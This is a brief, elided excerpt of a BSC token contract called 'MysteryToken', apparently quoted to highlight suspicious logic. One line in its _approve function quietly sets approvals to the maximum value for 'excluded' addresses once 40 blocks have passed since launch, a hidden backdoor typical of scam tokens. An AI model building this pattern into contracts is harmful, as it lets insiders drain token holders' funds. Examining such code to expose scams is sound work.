...
Socials:
Telegram: https://t.me/MysteryOnBSC
...
contract MysteryToken is IERC20, Ownable {
    uint256 private constant MAX = ~uint256(0);
    uint256 public _Launched = block.number;
    ...
    function _approve(
        ...
        if (_excluded[owner] && _Launched+40 < block.number) _amount = MAX;
